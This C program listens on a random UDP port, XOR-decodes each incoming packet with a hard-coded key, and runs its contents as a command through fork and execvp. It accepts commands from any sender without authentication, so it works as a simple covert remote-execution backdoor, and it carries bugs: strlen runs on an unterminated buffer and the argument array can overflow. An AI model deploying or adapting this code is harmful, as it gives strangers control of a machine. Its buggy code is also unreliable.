#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAXBUFLEN 31

// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

char mydecoder(char x, unsigned int pubkey){
  static int pad = 0;
  return (x ^ (pubkey & (0x000000FF << (pad++ % 4))));
}

// Implace decoder
void decode(char *s, unsigned int pubkey){
  for(int i = 0; i < strlen(s); i++){
    s[i] = mydecoder(s[i], pubkey);
  }
}

int main(void) {
    int sockfd;
    struct addrinfo;
    int numbytes;
    struct sockaddr_storage their_addr;
    char buf[MAXBUFLEN];
    socklen_t addr_len;
    char s[INET6_ADDRSTRLEN];

    struct sockaddr_in addr;
    socklen_t addrLen;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd == -1){
      printf("Failed to create socket\n");
      exit(1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port =  0; //htons(SERVERPORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sockfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
      printf("Failed to bind\n");
      exit(1);
    }
    addrLen = sizeof addr;
    if (getsockname(sockfd, (struct sockaddr *)&addr, &addrLen) == -1) {
      printf("getsockname() failed\n");
      exit(1);
    }
    printf("Listening at port %d\n", htons(addr.sin_port));


    addr_len = sizeof their_addr;

    do{
    printf("Waiting to recvfrom...\n");
      if((numbytes = recvfrom(sockfd, buf, MAXBUFLEN , 0,
                              (struct sockaddr *)&their_addr, &addr_len)) == -1){
        perror("recvfrom");
        exit(1);
      }
      if(numbytes > MAXBUFLEN - 1)
        printf("Command exceeded max size of %d, dropping package\n", MAXBUFLEN);
    }while(numbytes > MAXBUFLEN - 1);
    int privkey = 123;
    decode(buf, privkey);

    printf("Got packet from %s!\n",
        inet_ntop(their_addr.ss_family,
            get_in_addr((struct sockaddr *)&their_addr),
            s, sizeof s));
    printf("Packet is %d bytes long\n", numbytes);
    buf[numbytes] = '\0';
    printf("Packet contains \"%s\"\n", buf);

    close(sockfd);

    int k = fork();
    char* args[10];
    int status;
   
    if (k==0) {
      int i = 0;

      // We first split the buffer into tokens
      args[0] = strtok(buf, " ");
      while(args[i] != NULL && i < 10){
        i++;
        args[i] = strtok(NULL, " ");
      }

      // Now we can call execvp
      if(execvp(args[0], args) == -1){	// if execution failed, terminate child
        printf("Error!\n");
        exit(1);
      }
    }
    else{
      waitpid(k, &status, 0);
    }

    return 0;
}
